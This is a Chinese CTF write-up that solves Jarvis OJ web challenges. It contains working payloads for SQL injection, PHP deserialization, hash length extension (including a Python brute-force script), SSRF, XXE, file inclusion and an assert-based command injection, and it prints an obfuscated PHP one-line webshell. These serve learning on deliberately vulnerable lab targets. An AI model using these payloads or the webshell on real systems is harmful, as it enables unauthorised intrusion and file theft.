---
title: Jarvis OJ WriteUp(Web)
date: 2020-03-10 12:47:16
categories:
  - CTF
---

平台链接：<https://www.jarvisoj.com/challenges>

<!-- more -->

## PORT51

题目链接：<http://web.jarvisoj.com:32770/>

![](https://images.hujiekang.top/blogimage-ea31f0ef8a2864a898c809ede923a53b-245facf7.png)

题目要求使用51端口访问这个网页，于是使用`Curl`中的`--local-port`参数即可拿到flag：
（查了一下发现也可以通过Socket编程实现，等学完计网编程再来整一个）

![](https://images.hujiekang.top/blogimage-f9c54db3d005d29f368264c071c18169-f2afd3ee.png)

## LOCALHOST

题目链接：<http://web.jarvisoj.com:32774/>

![](https://images.hujiekang.top/blogimage-029d621234de681ddab9a9b264a3a3e8-5e9ff409.png)

提示只能使用localhost地址访问，于是抓包后添加`X-Forwarded-For: 127.0.0.1`行，提交拿到flag：

![](https://images.hujiekang.top/blogimage-d0faf73563fef5474dfaf3dbb4574d9c-d1c8d853.png)

## Login

题目链接：<http://web.jarvisoj.com:32772/>

![](https://images.hujiekang.top/blogimage-c1d633a3a8aa0bd0038393e052324803-8098f29b.png)

只有一个密码框，抓包发现响应头里面有Hint：

> Hint: "``select * from `admin` where password='".md5($pass,true)."'``"

发现`md5()`函数的第二个参数为`true`，查询官方文档得知：若第二个参数`raw_output`设置为`true`，则返回的是16字节长度的二进制md5数据。所以原理上，只要让md5后的二进制值被解释为字符串后产生注入就可以了。

这里参考了[这篇文章](https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)的思路：在进行数值比较时，由于MySQL会自动把数字开头的字符串转换成对应的数字，所以尝试让md5后的字符串出现`'or'+一个大于0的数字`，语句就变为``select * from `admin` where password='xxx'or'1xxx'``，后面的`1xxx`被自动转换为数字1，变为Bool也就是`true`了。

当然还可以存在一些变体，如大小写变化和`||`等，于是一共就有五种情况：`'or'`、`'Or'`、`'oR'`、`'OR'`和`'||'`。

于是接下来就可以爆破了。由于数据量太大，百度得到有两个值符合这个要求（以后有时间来爆破一下）

> content: 129581926211651571912466741651878684928
> hex:     06da5430449f8f6f23dfc1276f722738
> raw:     �T0D��o#��<b style="color:#ff8181">'or'8</b>

> content: ffifdyop
> hex:     276f722736c95d99e921722cf9ed621c
> raw:     <b style="color:#ff8181">'or'6</b>�]��!r,��b

输入这两个值中的一个，得到flag：`PCTF{R4w_md5_is_d4ng3rous}`

## 神盾局的秘密

题目链接：<http://web.jarvisoj.com:32768/>

题目打开只有一张图片，查看源代码发现`showimg.php`使用base64编码数据读取文件：

![](https://images.hujiekang.top/blogimage-8b153c5cea0540d7cd009bf1616ef7e2-5f99a5d1.png)

解码`c2hpZWxkLmpwZw==`得到`shield.jpg`，于是尝试使用base64编码访问`index.php`和`showimg.php`，拿到源码：

```php
// img=aW5kZXgucGhw
// index.php
<?php
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
// img=c2hvd2ltZy5waHA=
// showimg.php
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	}
?>
```

发现还有`shield.php`，再整一下得到源码：

```php
// img=c2hpZWxkLnBocA==
// shield.php
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}

		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>
```

发现可以通过`showimg.php`实现文件读取，但是不允许直接读取`pctf.php`，也就是flag所在的地方。于是通过`index.php`的反序列化读取。

Payload：`?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`

![](https://images.hujiekang.top/blogimage-5fef0ff7d7438a8d4718f48a1b1d3fd1-085d7b47.png)

## In A Mess

题目链接：<http://web.jarvisoj.com:32780/>

查看源代码发现提示`index.phps`，于是访问得到源码

```php
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}

?>
```

于是就一个一个绕咯：

首先`$a`比较好绕，用`php://input`；`$id`可以使用弱类型比较绕过；就是这个`eregi()`函数不是很熟悉，查询文档发现这是一个已被弃用的函数，作用和正则表达式匹配的`preg_match()`函数是一样的。

查找资料发现`eregi()`可以%00截断，且输入参数为数组时会返回NULL，于是构造Payload：

![](https://images.hujiekang.top/blogimage-0625e096424948397445abf4c7346278-3eb1c6ea.png)

得到了一串字符，但是提交发现并不是flag。于是猜测是目录，访问<http://web.jarvisoj.com:32780/^HT2mCpcvOLf>，发现是个SQL注入。测试一番发现过滤了空格、`union`、`select`、`from`和`/**/`，且注入成功但没有查询到结果，就会返回注入的语句；如果出现了被过滤的关键字，就会返回`you bad boy/girl!`。

于是开始手工注入：得到表名为content，一共有三列id,context,title ，flag为`PCTF{Fin4lly_U_got_i7_C0ngRatulation5}`。

Payload：`http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/seleselectct/*1*/null,null,group_concat(id,context,title)/*1*/frfromom/*1*/content`

## RE?

> Hint: 咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦

题目文件：[点击下载](https://o.hujiekang.top/downloads/udf.so.8d1686fa7f3fe70c213879c9ad90cf73)

看文件名叫UDF，于是百度了一下，发现这是MySQL的一个扩展接口（User Defined Function），用于构建用户的自定义函数。

可以把扩展放在MySQL的插件目录下（通过`Select @@plugin_dir`或`Show variables like "plugin%"`获取插件路径），然后使用下面的语句来导入、删除和执行函数：

```sql
CREATE [AGGREGATE] FUNCTION function_name RETURNS {STRING|INEGER|REAL} SONAME shared_library_name;
DROP FUNCTION function_name;
SELECT function_name();
```

扩展文件在Windows下是.dll文件，在linux下则是.so文件，不能够混用。

于是直接按步骤操作，就可以拿到flag了：

![](https://images.hujiekang.top/blogimage-8889c8bcd67a55b1ab3e5eacbe2dfa5d-5228261a.png)

更多关于UDF的信息和编写过程还可以参考官方文档和[这篇文章](https://blog.csdn.net/qq_20307987/article/details/88824432)。

## flag在管理员手里

题目链接：<http://web.jarvisoj.com:32778>

![](https://images.hujiekang.top/blogimage-19813a513f82d440977a8f053ac58118-9b6b5473.png)

首先查看源代码，没有什么特别的地方，在Cookie里面发现了role和hsh两个值：

> role=s%3A5%3A%22guest%22%3B; hsh=3a4727d57463f122833d9e732f94e4e0

role除去URL编码后是一个序列化的字符串，而hsh猜测是一个md5值，但是无法解出明文。尝试修改role对应字符串的值为admin，发现没有反应。

于是找找看看有没有别的地方有信息：尝试Git泄露，啥都没挖到；尝试临时文件/备份文件，发现`index.php~`，打开发现是Vim的备份文件。将后缀修改为.swp，使用`vim -r index.swp`拿到源码：

```php+HTML
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
	body {
		background:gray;
		text-align:center;
	}
</style>
</head>

<body>
	<?php
		$auth = false;
		$role = "guest";
		$salt =
		if (isset($_COOKIE["role"])) {
			$role = unserialize($_COOKIE["role"]);
			$hsh = $_COOKIE["hsh"];
			if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
				$auth = true;
			} else {
				$auth = false;
			}
		} else {
			$s = serialize($role);
			setcookie('role',$s);
			$hsh = md5($salt.strrev($s));
			setcookie('hsh',$hsh);
		}
		if ($auth) {
			echo "<h3>Welcome Admin. Your flag is
		} else {
			echo "<h3>Only Admin can see the flag!!</h3>";
		}
	?>

</body>
</html>
```

代码的关键在`$role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))`这一句，这里的md5值是带有salt的md5，而salt是什么并不知道，于是我又懵逼了。。。然后搜了一下，发现得益于md5、sha1等算法的迭代和填充特性，存在一种攻击方法叫hash长度扩展攻击，即在不知道salt的情况下，也可以计算出想要的md5值。

大概原理就是：由于md5的加密是分块进行的，且迭代执行，即前一块的输出结果作为后一块的输入。同时md5的每个分块的大小又是确定的64字节，且对于不满64字节的数据会进行填充。于是把第一组已知的数据md5值作为第二组的输入，其实就相当于将第一组的数据填充满至64字节，再追加第二组数据得到的md5值。具体可以查看这两篇文章：<https://www.freebuf.com/articles/web/69264.html>、<https://www.freebuf.com/articles/web/31756.html>。

可以使用HashPump来实施hash长度扩展攻击：<https://github.com/bwall/HashPump>

这里写了个很简单的代码作为例子叭：

```php
<?php
	$salt = "xxxxxx";
	echo md5($salt."hhhhhh");
	echo "<br>";
	echo md5($salt.urldecode($_GET['role']));
?>
```

在没有任何参数的情况下，程序会输出已知的md5值，在这里是`9b68ad7beffdaf8a1fc29048523cbd56`。然后把数据输入HashPump：

![](https://images.hujiekang.top/blogimage-472eab897f53aeb3b077a6594de4cb6b-05fb850b.png)

然后我们把最底下那串字符进行URL编码后作为`role`参数的值：

![](https://images.hujiekang.top/blogimage-66ca39ea5198cade5ba0803a57916003-3c031815.png)

可以看见第二行输出的md5值和HashPump输出的值一模一样。

搞懂了hash长度扩展攻击之后，接下来就是`$role==="admin"`的绕过了。这里绕过的原因，我一开始觉得可能是输入的串里面有%00截断掉了，但是后来看了一下别人的WriteUp，发现是PHP的反序列化本身的原因：PHP在反序列化完一个对象后，后面多余的字符会被忽略。测试了一下，的确如此。

还有一个问题：就是不知道salt的长度。再长长不过64字节，于是尝试使用脚本直接爆破：

```python
import os
import requests
import hashpumpy
import urllib.parse

url = "http://web.jarvisoj.com:32778"
md5 = "3a4727d57463f122833d9e732f94e4e0"
# 字符串要颠倒
original_str = ';"tseug":5:s'
admin_str = ';"nimda":5:s'

cookies = {
    'role': 's%3A5%3A%22guest%22%3B',
    'hsh': '3a4727d57463f122833d9e732f94e4e0'
}

for i in range(65):
    cookies['hsh'], message = hashpumpy.hashpump(md5, original_str, admin_str, i)
    cookies['role'] = urllib.parse.quote(message[::-1])  # 注意这里要把字符串倒回来再提交
    print(i, cookies)
    r = requests.get(url, cookies=cookies)
    if 'Welcome' in r.text:
        print(r.text)
```

长度为12时，打印出flag：

![](https://images.hujiekang.top/blogimage-f5df6fd3d6a300eaa78b46d57f4c65fa-f59e29e5.png)

## Chopper

> 小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？
>
> 关卡入口：<http://web.jarvisoj.com:32782/>

![](https://images.hujiekang.top/blogimage-834b406d0da069aa045958ab24834d6c-0ddf56ec.png)

点击管理员登录，提示不是管理员禁止访问。然后看一下源代码，提示管理员的IP是202.5.19.128：

![](https://images.hujiekang.top/blogimage-755dff1806fb678f00c058b7b31ad578-ba5bd285.png)

首先想到了X-Forwarded-For头，试了一下发现莫得反应。。。

然后又到处看了看，发现图片的src是通过`proxy.php`访问的，难道题目的意思是通过202.5.19.128的代理访问？

访问202.5.19.128，同样返回禁止访问。。。说明这个网站是存在服务的，那么尝试访问202.5.19.128/proxy.php，同样返回禁止访问，说明202.5.19.128也同样存在一个代理的页面。

此时想到了SSRF，即利用服务器的身份发起访问。访问`http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/`，返回404，而且url的值变成了`http://8080av.com`。。。。。。？？？

访问了一下<http://8080av.com>，没有发现什么东西。那么继续之前的叭：

访问`http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php`，有返回的信息了：

![](https://images.hujiekang.top/blogimage-755dff1806fb678f00c058b7b31ad578-ba5bd285.png)

说明这个方向肯定没错了，此时也没有返回403，说明我们已经获得了admin的身份，只需要再SSRF一次就行了：

![](https://images.hujiekang.top/blogimage-a3187359d5bb3ee08794b36e08c2b944-1031fcd3.png)

果然。。。但是这个页面并没有找到什么，于是翻robots、临时文件/备份文件、Git泄露，发现robots.txt有东西：

```bash
User-agent: *
Disallow:trojan.php
Disallow:trojan.php.txt
```

然后访问trojan.php.txt，拿到trojan.php源码：

```php
<?php ${("#"^"|").("#"^"|")}=("!"^"`").("( "^"{").("("^"[").("~"^";").("|"^".").("*"^"~");${("#"^"|").("#"^"|")}(("-"^"H"). ("]"^"+"). ("["^":"). (","^"@"). ("}"^"U"). ("e"^"A"). ("("^"w").("j"^":"). ("i"^"&"). ("#"^"p"). (">"^"j"). ("!"^"z"). ("T"^"g"). ("e"^"S"). ("_"^"o"). ("?"^"b"). ("]"^"t"));?>
```

拷到本地运行一哈，报错了，发现是一个assert语句，里面包着一个一句话木马：

![](https://images.hujiekang.top/blogimage-7c20883e73714c2be794f46fdc3ae112-8aaca140.png)

那就POST试一下叭：

![](https://images.hujiekang.top/blogimage-75bb939acff4fe7248da2e56f8bb2dd9-a91cedde.png)

## Easy Gallery

题目链接：<http://web.jarvisoj.com:32785/>

![](https://images.hujiekang.top/blogimage-dba5e7568da3f25b9e1cf3d7353cd4a5-8375d3d8.png)

打开就是个简易的相册界面，可以进行图片的上传和查看，查看的时候要输入文件的后缀才能查看。

然后尝试直接上传了一个一句话木马，返回要求文件格式必须为jpg和gif。于是加上jpg文件头`FF D8 FF`后再次上传，发现成功，返回了图片的ID（不就是时间戳嘛。。。。。。）

![](https://images.hujiekang.top/blogimage-31aab2652bf4d12a6da061414aa829fc-87675121.png)

然后在View界面，输入ID和文件类型jpg，得到图片的地址：

![](https://images.hujiekang.top/blogimage-abd8aeb478cd126832ef4be8219e2e68-59e7af36.png)

当然这里图片被服务器认为是图片文件而不是脚本，所以莫得效果。四处看看，发现主页的`page`参数貌似可以文件包含。尝试`page=uploads/1584187719.jpg`，发现报错了，原来后缀直接加了.php导致找不到文件，于是%00截断绕过，发现好像做了关键字过滤。。。

![](https://images.hujiekang.top/blogimage-f1cdc624a92efd76235d5f255eb3e1b4-9e56ddc1.png)

然后百度查找原因，发现PHP在低版本中还有另一种脚本格式：`<script language="php">code...</script>`，于是修改后上传，然后进行包含再加%00截断，拿到flag：

![](https://images.hujiekang.top/blogimage-6e357e4b652c4af4d8422edd52aeca32-c463b83f.png)

## Simple Injection

题目链接：<http://web.jarvisoj.com:32787>

这题就是一个很单纯的注入了。。。发现注入成功会显示密码错误，若注入失败产生了错误则显示用户名错误

然后又发现了过滤了空格，其他的倒没有。。。然后就用SQLMap，注入方式选盲注，然后用一个空格替换为注释的tamper：

Payload：`python sqlmap.py -r 1.txt --tamper space2comment --technique TB --dump`

![](https://images.hujiekang.top/blogimage-849d0183d6e9fa67cab6c6ddfcd3cc7d-d2079a07.png)

把密码用md5解密，拿到真正的密码，登录拿到flag：

![](https://images.hujiekang.top/blogimage-87fba434c026a89e16fd9e04624f332a-d12cf1cf.png)

![](https://images.hujiekang.top/blogimage-56457a46bd71879986293a397f747795-c6d0a4bb.png)

## api调用

题目链接：<http://web.jarvisoj.com:9882/>

> 请设法获得目标机器/home/ctf/flag.txt中的flag值。

![](https://images.hujiekang.top/blogimage-b301fd79931650b96ca7bba3fe79f9f1-1bc5a023.png)

这题目反正就是输入什么，上面那个文本框就会显示什么，然并卵。。。并不能进行XSS。。。

于是查看源代码，发现程序使用`XMLHttpRequest`传递了json数据给/api/v1.0/try目录：

![](https://images.hujiekang.top/blogimage-c4e2e45d487b5c6ea19e9162e57dfe69-e1597217.png)

看到这种结构化数据，就想到了XXE，于是抓包把格式改成XML，然后使用XML实体读取/home/ctf/flag.txt文件，拿到flag：

![](https://images.hujiekang.top/blogimage-361bb59e533e50773b744c4aee8cb4bd-2bbe0cf5.png)

关于XXE，[这篇文章](https://xz.aliyun.com/t/3357)说的相当详细，可以参考一哈。

## Web？

题目链接：<http://web.jarvisoj.com:9891/#/>

打开题目就一个输入密码框，但也没有啥提示，直到发现引用了一个自己写的`app.js`，于是把它整下来美化一下，emmmm一共快20000行。。。

然后搜索密码错误的信息，定位到`checkpass`函数：

![](https://images.hujiekang.top/blogimage-83474e5e44dd04975028c6e5254e20bf-d26fea0c.png)

然后通过`checkpass`定位到了`__checkpass__REACT_HOT_LOADER__`：

![](https://images.hujiekang.top/blogimage-c8d6cb16d6eb27721aec26e1920abdb1-9bedf966.png)

再次定位，定位到了一个函数：

```js
{
    key: "__checkpass__REACT_HOT_LOADER__",
	value: function(e) {
        if (25 !== e.length) return !1;
        for (var t = [], n = 0; n < 25; n++) t.push(e.charCodeAt(n));
        for (var r = [325799, 309234, 317320, 327895, 298316, 301249, 330242, 289290, 273446, 337687, 258725, 267444, 373557, 322237, 344478, 362136, 331815, 315157, 299242, 305418, 313569, 269307, 338319, 306491, 351259], o = [[11, 13, 32, 234, 236, 3, 72, 237, 122, 230, 157, 53, 7, 225, 193, 76, 142, 166, 11, 196, 194, 187, 152, 132, 135], [76, 55, 38, 70, 98, 244, 201, 125, 182, 123, 47, 86, 67, 19, 145, 12, 138, 149, 83, 178, 255, 122, 238, 187, 221], [218, 233, 17, 56, 151, 28, 150, 196, 79, 11, 150, 128, 52, 228, 189, 107, 219, 87, 90, 221, 45, 201, 14, 106, 230], [30, 50, 76, 94, 172, 61, 229, 109, 216, 12, 181, 231, 174, 236, 159, 128, 245, 52, 43, 11, 207, 145, 241, 196, 80], [134, 145, 36, 255, 13, 239, 212, 135, 85, 194, 200, 50, 170, 78, 51, 10, 232, 132, 60, 122, 117, 74, 117, 250, 45], [142, 221, 121, 56, 56, 120, 113, 143, 77, 190, 195, 133, 236, 111, 144, 65, 172, 74, 160, 1, 143, 242, 96, 70, 107], [229, 79, 167, 88, 165, 38, 108, 27, 75, 240, 116, 178, 165, 206, 156, 193, 86, 57, 148, 187, 161, 55, 134, 24, 249], [235, 175, 235, 169, 73, 125, 114, 6, 142, 162, 228, 157, 160, 66, 28, 167, 63, 41, 182, 55, 189, 56, 102, 31, 158], [37, 190, 169, 116, 172, 66, 9, 229, 188, 63, 138, 111, 245, 133, 22, 87, 25, 26, 106, 82, 211, 252, 57, 66, 98], [199, 48, 58, 221, 162, 57, 111, 70, 227, 126, 43, 143, 225, 85, 224, 141, 232, 141, 5, 233, 69, 70, 204, 155, 141], [212, 83, 219, 55, 132, 5, 153, 11, 0, 89, 134, 201, 255, 101, 22, 98, 215, 139, 0, 78, 165, 0, 126, 48, 119], [194, 156, 10, 212, 237, 112, 17, 158, 225, 227, 152, 121, 56, 10, 238, 74, 76, 66, 80, 31, 73, 10, 180, 45, 94], [110, 231, 82, 180, 109, 209, 239, 163, 30, 160, 60, 190, 97, 256, 141, 199, 3, 30, 235, 73, 225, 244, 141, 123, 208], [220, 248, 136, 245, 123, 82, 120, 65, 68, 136, 151, 173, 104, 107, 172, 148, 54, 218, 42, 233, 57, 115, 5, 50, 196], [190, 34, 140, 52, 160, 34, 201, 48, 214, 33, 219, 183, 224, 237, 157, 245, 1, 134, 13, 99, 212, 230, 243, 236, 40], [144, 246, 73, 161, 134, 112, 146, 212, 121, 43, 41, 174, 146, 78, 235, 202, 200, 90, 254, 216, 113, 25, 114, 232, 123], [158, 85, 116, 97, 145, 21, 105, 2, 256, 69, 21, 152, 155, 88, 11, 232, 146, 238, 170, 123, 135, 150, 161, 249, 236], [251, 96, 103, 188, 188, 8, 33, 39, 237, 63, 230, 128, 166, 130, 141, 112, 254, 234, 113, 250, 1, 89, 0, 135, 119], [192, 206, 73, 92, 174, 130, 164, 95, 21, 153, 82, 254, 20, 133, 56, 7, 163, 48, 7, 206, 51, 204, 136, 180, 196], [106, 63, 252, 202, 153, 6, 193, 146, 88, 118, 78, 58, 214, 168, 68, 128, 68, 35, 245, 144, 102, 20, 194, 207, 66], [154, 98, 219, 2, 13, 65, 131, 185, 27, 162, 214, 63, 238, 248, 38, 129, 170, 180, 181, 96, 165, 78, 121, 55, 214], [193, 94, 107, 45, 83, 56, 2, 41, 58, 169, 120, 58, 105, 178, 58, 217, 18, 93, 212, 74, 18, 217, 219, 89, 212], [164, 228, 5, 133, 175, 164, 37, 176, 94, 232, 82, 0, 47, 212, 107, 111, 97, 153, 119, 85, 147, 256, 130, 248, 235], [221, 178, 50, 49, 39, 215, 200, 188, 105, 101, 172, 133, 28, 88, 83, 32, 45, 13, 215, 204, 141, 226, 118, 233, 156], [236, 142, 87, 152, 97, 134, 54, 239, 49, 220, 233, 216, 13, 143, 145, 112, 217, 194, 114, 221, 150, 51, 136, 31, 198]], n = 0; n < 25; n++) {
            for (var i = 0, a = 0; a < 25; a++) i += t[a] * o[n][a];
            if (i !== r[n]) return !1
        }
        return !0
    }
}
```

仔细看看代码逻辑，发现传入的数组每个索引值会乘以第二个二维数组中对应的索引，然后逐个相加，最后和数组`r`对应的值相比是否相等，如果全部相等返回1，反之返回0

这。。。。不就是解线性方程组嘛。。。。。

于是就开始解了，自己解是不可能的，找了个[在线网站](http://www.yunsuan.info/matrixcomputations/solvelinearsystems.html)直接输进去数据秒出答案：

![](https://images.hujiekang.top/blogimage-01095cb6cab683eeea23e0dc0f14e961-3a5815bb.png)

分别转换成ASCII码，得到flag：`QWB{R3ac7_1s_interesting}`

## [61dctf]admin

题目链接：<http://web.jarvisoj.com:32792/>

打开页面只有一个Hello World，别的啥也没有，于是祭出老三样：robots、git泄露、临时文件/备份文件，发现robots.txt有东西：

> `Disallow: /admin_s3cr3t.php`

访问得到一个假flag`flag{hello guest}`，然后查看请求头发现Cookie：`admin=0`，改成1后拿到flag`flag{hello_admin~}`

## [61dctf]inject

题目链接：<http://web.jarvisoj.com:32794/>

> Hint1: 先找到源码再说吧~~

打开页面只显示了一个flag{xxx}，除此之外没别的东西。于是又开始到处找，发现index.php~泄露源码：

```php
<?php
require("config.php");
$table = $_GET['table']?$_GET['table']:"test";
$table = Filter($table);
mysqli_query($mysqli,"desc `secret_{$table}`") or Hacker();
$sql = "select 'flag{xxx}' from secret_{$table}";
$ret = sql_query($sql);
echo $ret[0];
?>
```

可以看见这里执行了两条SQL语句，第一条只是排顺序的语句肯定无法注入，但是需要绕过；而第二条则是注入点。

要绕过第一条语句，首先要让反引号闭合。查了一下百度，有人说两个连续的反引号可以当作一个空格使用，但是经过测试，两个连续的反引号在执行时会报错，而反引号之间添加一个空格则不会：

![](https://images.hujiekang.top/blogimage-1a89348279fd5c3ca27fad59f5d23c74-d8ad732a.png)

于是尝试Payload：``table=flag` `union select 1``（表名flag我猜的&#x1F602;），发现返回值没有变化，于是增加列数，发现返回均为`D`，于是得知数据表只有一列。

接下来就是一套纯手工的注入了：

![](https://images.hujiekang.top/blogimage-db0530f44877ae94b146da15339d27d4-f1c6c5e0.png)

## [61dctf]babyphp

题目链接：<http://web.jarvisoj.com:32798/>

![](https://images.hujiekang.top/blogimage-32c93eb09e2432256339426747bc95eb-965edaef.png)

网页有三个Tab，全部点了一遍，发现About页中提到用了Git，于是想到Git泄露，用Git_Extract扫一哈拿到源码：

![](https://images.hujiekang.top/blogimage-c1f474584a1580c44f367e0104782fa5-e99ce96b.png)

然后在index.php中发现关键代码：

```php
<?php
if (isset($_GET['page'])) {
	$page = $_GET['page'];
} else {
	$page = "home";
}
$file = "templates/" . $page . ".php";
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('$file')") or die("That file doesn't exist!");
?>
```

我们知道`assert()`是可以把字符串当作代码执行的，所以这里应该存在命令注入的可能。想要读取flag.php，需要的系统命令为`cat templates/flag.php`，所以拼接字符串的目标效果如下：

```php
$file = "templates/'.system("cat templates/flag.php").'.php";
//Actual Code
assert("strpos('templates/'.system("cat templates/flag.php").'.php', '..') === false") or die("Detected hacking attempt!");
strpos('templates/'.system("cat templates/flag.php").'.php', '..') === false
assert("file_exists('templates/'.system("cat templates/flag.php").'.php')") or die("That file doesn't exist!");
file_exists('templates/'.system("cat templates/flag.php").'.php')
```

于是尝试令page参数的值为`'.system("cat templates/flag.php").'`，发现返回文件不存在错误，查看源代码得到flag：

![](https://images.hujiekang.top/blogimage-c397a5cc65dfe81f228082dc8bba9680-f1563d72.png)

## PHPINFO

题目链接：<http://web.jarvisoj.com:32784/>

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

这道题是一道PHP Session反序列化的题目，PHP Session的反序列化有三种模式：

| 模式          | 反序列化格式                                                 | 举例                     |
| ------------- | ------------------------------------------------------------ | ------------------------ |
| php_binary    | 键名的长度对应的ASCII字符＋键名＋经过`serialize()`函数反序列处理的值 | `examples:8:"whatever";` |
| php           | 键名＋竖线＋经过`serialize()`函数反序列处理的值              | `example|s:8:"whatever";`        |
| php_serialize | `serialize()`函数反序列处理数组方式                          | `a:1:{s:7:"example";s:8:"whatever";}` |

可以看见，Session的反序列化都是把传入的数据当作一个关联数组来看待的。当序列化使用的是php_serialize，而反序列化使用的是php，那么就可能出现反序列化漏洞。

下面写了两个简单的示例：

```php
<?php
    // index.php
    ini_set('session.serialize_handler','php_serialize');
    session_start();

    $_SESSION['example'] = $_GET['example'];
    var_dump($_SESSION);
?>
<?php
    // 1ndex.php
    ini_set('session.serialize_handler','php');
    session_start();

    var_dump($_SESSION);

    class Example {
        public $whatever;
        function __destruct()
        {
            eval($this->whatever);
        }
    }
?>
```

首先在index.php随意输入数据，发现Session中的信息没有问题，然后跳转到1ndex.php，发现由于序列化方式不同，无法读取数据：

![](https://images.hujiekang.top/blogimage-63cb0cf9d6589dc6a4ba1e02c0fed1da-59c66353.png)

然后精心构造一下Example对象数据进去，发现原本被当成字符串的数据在1ndex.php下被反序列化成了一个对象，因为在php模式下是以`|`来对键和键值进行分隔的，而我们知道序列化对象后面多余的字符不会影响序列化，所以就可以成功的反序列化出Example对象：

![](https://images.hujiekang.top/blogimage-d303bb9b280bed5ecfdd96ee94aee2c3-f7068599.png)

接下来回到题目叭。题目并没有提供给我们创建Session的地方，然后就很懵逼。。。

百度了一下之后发现phpinfo里面`session.upload_progress.enabled`设置为了On，这样当有文件上传的时候，会相应的在Session中产生一个上传进度信息，下面是[PHP文档](https://www.php.net/manual/zh/session.upload-progress.php)中的解释：

> 当 `session.upload_progress.enabled` INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态
>
> 当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时，上传进度可以在`$_SESSION`中获得。 当PHP检测到这种POST请求时，它会在`$_SESSION`中添加一组数据, 索引是 `session.upload_progress.prefix` 与 `session.upload_progress.name`连接在一起的值。

于是构造一个上传界面：

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
<!-- 上传文件的mime类型必须是不做文件编码的multipart/form-data类型-->
```

抓包，修改文件名为对象序列化值后提交，成功得到主页目录下的文件名（双引号要转义避免出现问题）：

![](https://images.hujiekang.top/blogimage-bea72bb815a632a81cb28f1df132a783-6bfc21a4.png)

然后尝试读取Here_1s_7he_fl4g_buT_You_Cannot_see.php的内容，Payload：`filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:89:\"print_r(file_get_contents(dirname(__FILE__).\"/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}"`

![](https://images.hujiekang.top/blogimage-88472b218947674db54d8a8f4058dd53-9e9c0dde.png)

关于PHP反序列化：<https://www.jb51.net/article/107101.htm>、<https://blog.csdn.net/nzjdsds/article/details/82703639>

## 图片上传漏洞

## [61dctf]register

## [61dctf]babyxss

还有三题没做。。。以后慢慢搞
